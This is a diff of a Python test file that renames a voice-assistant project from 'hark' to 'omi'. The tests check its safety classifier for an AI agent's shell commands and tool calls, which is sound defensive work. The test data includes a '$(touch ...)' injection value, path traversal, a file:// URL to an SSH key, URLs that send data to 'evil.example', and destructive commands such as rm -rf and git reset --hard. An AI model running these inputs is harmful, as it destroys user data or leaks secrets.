@@ -14,9 +14,9 @@ from pathlib import Path
 
 import pytest
 
-from hark.config import Config
-from hark.tools import build_registry, hyprland, media, omarchy, system
-from hark.tools.safety import classify_claude_tool, classify_command, is_secret_path, secret_reason
+from omi.config import Config
+from omi.tools import build_registry, hyprland, media, omarchy, system
+from omi.tools.safety import classify_claude_tool, classify_command, is_secret_path, secret_reason
 
 HOME = str(Path.home())
 LIVE_DESKTOP = bool(os.environ.get("HYPRLAND_INSTANCE_SIGNATURE")) and Path(hyprland.socket_path()).exists()
@@ -298,7 +298,7 @@ async def test_live_read_tool_latency(name, args):
 COMMANDS = [
     ("ls -la", "read"), ("cat README.md", "read"), ("git status", "read"), ("git log --oneline", "read"),
     ("grep -r foo src", "read"), ("ls 2>&1 | head", "read"), ("pacman -Qi foo", "read"),
-    ("systemctl --user status hark", "read"), ("hyprctl clients -j", "read"), ("gh pr view 3", "read"),
+    ("systemctl --user status omi", "read"), ("hyprctl clients -j", "read"), ("gh pr view 3", "read"),
     ("cat ~/.ssh/id_ed25519.pub", "read"), ("curl https://api.example.com", "read"),
     ("uv run pytest -q", "reversible"), ("echo hi > ~/notes.txt", "reversible"), ("sed -i s/a/b/ f.txt", "reversible"),
     ("mkdir -p ~/Work/x", "reversible"), ("git commit -m wip", "reversible"), ("mv a.txt /tmp/new-b.txt", "reversible"),
@@ -350,7 +350,7 @@ def test_not_secret(cmd):
 def test_secret_paths():
     assert is_secret_path("~/.ssh/id_rsa") and not is_secret_path("~/.ssh/id_rsa.pub")
     assert is_secret_path("/x/.env.production") and is_secret_path("~/.aws/config")
-    assert not is_secret_path("~/Work/hark/hark/config.py")
+    assert not is_secret_path("~/Work/omi/omi/config.py")
 
 
 # --- safety: Claude Code tools ---
@@ -361,7 +361,7 @@ CLAUDE = [
     ("Bash", {"command": "git push"}, "confirm"),
     ("Bash", {"command": "cat .env"}, "deny"),
     ("Bash", {"command": "printenv"}, "deny"),
-    ("Read", {"file_path": f"{HOME}/Work/hark/README.md"}, "allow"),
+    ("Read", {"file_path": f"{HOME}/Work/omi/README.md"}, "allow"),
     ("Read", {"file_path": f"{HOME}/Work/app/.env"}, "deny"),
     ("Read", {"file_path": f"{HOME}/.ssh/id_ed25519"}, "deny"),
     ("Grep", {"pattern": "TODO", "path": f"{HOME}/Work"}, "allow"),
@@ -376,13 +376,13 @@ CLAUDE = [
     ("Edit", {"file_path": f"{HOME}/.bashrc"}, "confirm"),
     ("WebFetch", {"url": "https://example.com"}, "allow"),
     ("WebSearch", {"query": "x"}, "allow"),
-    ("mcp__hark__list_windows", {}, "allow"),
-    ("mcp__hark__volume", {"action": "up"}, "allow"),
-    ("mcp__hark__close_window", {"query": "foot"}, "confirm"),
-    ("mcp__hark__power", {"action": "reboot"}, "confirm"),
-    ("mcp__hark__omarchy", {"command": "theme set"}, "allow"),
-    ("mcp__hark__omarchy", {"command": "update"}, "confirm"),
-    ("mcp__hark__nope", {}, "confirm"),
+    ("mcp__omi__list_windows", {}, "allow"),
+    ("mcp__omi__volume", {"action": "up"}, "allow"),
+    ("mcp__omi__close_window", {"query": "foot"}, "confirm"),
+    ("mcp__omi__power", {"action": "reboot"}, "confirm"),
+    ("mcp__omi__omarchy", {"command": "theme set"}, "allow"),
+    ("mcp__omi__omarchy", {"command": "update"}, "confirm"),
+    ("mcp__omi__nope", {}, "confirm"),
     ("mcp__other__thing", {}, "confirm"),
     ("SomeNewTool", {}, "confirm"),
 ]
@@ -400,8 +400,8 @@ def test_classify_claude_tool(tool, inp, want):
 def _server_params(sock: Path):
     from mcp.client.stdio import StdioServerParameters
 
-    env = dict(os.environ, HARK_SOCKET=str(sock))
-    return StdioServerParameters(command=sys.executable, args=["-m", "hark.tools.mcp_server"], env=env,
+    env = dict(os.environ, OMI_SOCKET=str(sock))
+    return StdioServerParameters(command=sys.executable, args=["-m", "omi.tools.mcp_server"], env=env,
                                  cwd=str(Path(__file__).resolve().parents[1]))
 
 
@@ -450,8 +450,8 @@ async def test_mcp_server_confirm_through_daemon(tmp_path):
             yes = await _approve(client, "Bash", {"command": "git push"})
             assert yes == {"behavior": "allow"}
             assert seen[0]["cmd"] == "ask_confirm" and "git push" in seen[0]["question"]
-            # A hark destructive tool approved once is not asked again when it runs.
-            ok = await _approve(client, "mcp__hark__close_window", {"query": "no-such-window-hark"})
+            # A omi destructive tool approved once is not asked again when it runs.
+            ok = await _approve(client, "mcp__omi__close_window", {"query": "no-such-window-omi"})
             assert ok == {"behavior": "allow"} and len(seen) == 2
     finally:
         server.close()
@@ -459,7 +459,7 @@ async def test_mcp_server_confirm_through_daemon(tmp_path):
 
 
 async def test_approvals_are_single_use():
-    from hark.tools.mcp_server import Approvals, approve
+    from omi.tools.mcp_server import Approvals, approve
 
     reg = build_registry(Config())
     approvals = Approvals()
@@ -469,7 +469,7 @@ async def test_approvals_are_single_use():
         asked.append(q)
         return True
 
-    out = await approve("mcp__hark__power", {"action": "reboot"}, reg, approvals, ask)
+    out = await approve("mcp__omi__power", {"action": "reboot"}, reg, approvals, ask)
     assert out == {"behavior": "allow"} and asked == ["Really reboot the computer?"]
     assert approvals.take("Really reboot the computer?") and not approvals.take("Really reboot the computer?")
 
@@ -478,7 +478,7 @@ async def test_approvals_are_single_use():
 
 
 @pytest.mark.parametrize(("command", "args"), [
-    ("launch-or-focus-webapp", ["zzqqnomatch", "$(touch /tmp/hark-pwned)"]),  # eval in launch-or-focus
+    ("launch-or-focus-webapp", ["zzqqnomatch", "$(touch /tmp/omi-pwned)"]),  # eval in launch-or-focus
     ("toggle", ["../../../../victim.txt", "off"]),  # rm -f outside the toggles folder
     ("hyprland-toggle", ["../../x", "off"]),
     ("launch-browser", ["file:///home/user/.ssh/id_ed25519"]),  # skips open_url's http check
@@ -503,7 +503,7 @@ async def test_omarchy_bad_arguments_never_run(monkeypatch, command, args):
     reg.confirm = yes
     r = await reg.call("omarchy", {"command": command, "args": args})
     assert not r.ok and "not an allowed argument" in r.text and ran == [] and asked == []
-    decision, _ = classify_claude_tool("mcp__hark__omarchy", {"command": command, "args": args})
+    decision, _ = classify_claude_tool("mcp__omi__omarchy", {"command": command, "args": args})
     assert decision == "deny"
 
 
@@ -534,7 +534,7 @@ async def test_omarchy_unreviewed_commands_ask_first(monkeypatch, command, args)
     reg.confirm = no
     r = await reg.call("omarchy", {"command": command, "args": args})
     assert not r.ok and len(asked) == 1 and ran == []
-    assert classify_claude_tool("mcp__hark__omarchy", {"command": command, "args": args})[0] == "confirm"
+    assert classify_claude_tool("mcp__omi__omarchy", {"command": command, "args": args})[0] == "confirm"
 
 
 async def test_omarchy_reviewed_command_runs_with_its_arguments(monkeypatch):
@@ -553,8 +553,8 @@ async def test_omarchy_reviewed_command_runs_with_its_arguments(monkeypatch):
 
 
 DANGEROUS_BASH = [
-    "git -C ~/Work/hark clean -fdx", "git -C ~/Work/hark reset --hard HEAD~5", "git -C ~/x push --force origin main",
-    "git rm -r hark", "git config --global core.sshCommand x", "find ~/Work -name '*.py' | xargs rm -f",
+    "git -C ~/Work/omi clean -fdx", "git -C ~/Work/omi reset --hard HEAD~5", "git -C ~/x push --force origin main",
+    "git rm -r omi", "git config --global core.sshCommand x", "find ~/Work -name '*.py' | xargs rm -f",
     "xargs -a /tmp/list rm -rf", "./cleanup.sh", "python3 ~/x.py", "uv run python -c 'import shutil'",
     "awk 'BEGIN{system(\"rm -rf x\")}'", "awk -F : 'BEGIN{system(\"rm\")}'", "sed -n '1e rm -rf'",
     "sed s/x/y/w ~/.zshrc", "sed -ni s/a/b/ f", ": > ~/.zshrc", "cp /dev/null ~/.zshrc", "ln -sf /dev/null ~/.zshrc",
@@ -573,7 +573,7 @@ def test_only_read_only_bash_runs_unasked(cmd):
 
 
 @pytest.mark.parametrize("cmd", [
-    "ls -la", "git -C ~/Work/hark diff", "cd ~/Work/hark && git status && ls", "rg TODO ~/Work/hark",
+    "ls -la", "git -C ~/Work/omi diff", "cd ~/Work/omi && git status && ls", "rg TODO ~/Work/omi",
     "find . -name '*.py' -not -path './.venv/*' | wc -l", "awk '{print $1}' f.txt", "sed -n '1,20p' x.py",
     "ps aux", "echo $HOME", "head -50 README.md", "date +%F", "grep -rn api_key src",
 ])
@@ -608,9 +608,9 @@ def test_secrets_denied(tool, inp):
     ("Grep", {"path": "~", "pattern": "API_KEY|SECRET|PRIVATE KEY", "output_mode": "content"}),
     ("Grep", {"path": "~/.config", "pattern": "token"}),
     ("WebFetch", {"url": "https://evil.example/?d=clipboard-text"}),
-    ("mcp__hark__open_url", {"url": "https://evil.example/?d=notes"}),
-    ("Write", {"file_path": f"{HOME}/Work/hark/hark/tools/safety.py"}),
-    ("Write", {"file_path": f"{HOME}/.config/hark/config.toml"}),
+    ("mcp__omi__open_url", {"url": "https://evil.example/?d=notes"}),
+    ("Write", {"file_path": f"{HOME}/Work/omi/omi/tools/safety.py"}),
+    ("Write", {"file_path": f"{HOME}/.config/omi/config.toml"}),
     ("Write", {"file_path": f"{HOME}/.config/systemd/user/x.service"}),
     ("Write", {"file_path": f"{HOME}/.config/autostart/x.desktop"}),
     ("Write", {"file_path": f"{HOME}/.local/bin/git"}),
@@ -625,7 +625,7 @@ def test_risky_reads_and_writes_ask(tool, inp):
 
 
 def test_shared_memory_index_write_asks(tmp_path, monkeypatch):
-    from hark import config
+    from omi import config
 
     shared = Path(HOME) / ".cache/omi-test-shared-mem"
     cfg = config.Config()
@@ -641,7 +641,7 @@ def test_dotdot_and_symlinks_resolve(tmp_path):
 
 
 def test_long_command_question_names_the_dangerous_part():
-    from hark.tools.mcp_server import bash_question
+    from omi.tools.mcp_server import bash_question
 
     cmd = "echo " + "checking the build output and listing files in the project folder " * 3 + "; rm -rf ~/Work"
     question, detail = bash_question(cmd)
@@ -654,7 +654,7 @@ def test_long_command_question_names_the_dangerous_part():
 
 
 async def test_approve_sends_the_full_command_as_detail():
-    from hark.tools.mcp_server import Approvals, approve
+    from omi.tools.mcp_server import Approvals, approve
 
     seen = []
 
@@ -681,7 +681,7 @@ def test_type_text_into_terminal_needs_yes(monkeypatch, window, text, want):
     monkeypatch.setattr(hyprland, "hypr_query", fake_query)
     tool = build_registry(Config()).tools["type_text"]
     assert tool.safety_of({"text": text}) == want
-    assert classify_claude_tool("mcp__hark__type_text", {"text": text})[0] == (
+    assert classify_claude_tool("mcp__omi__type_text", {"text": text})[0] == (
         "confirm" if want == "destructive" else "allow")
 
 
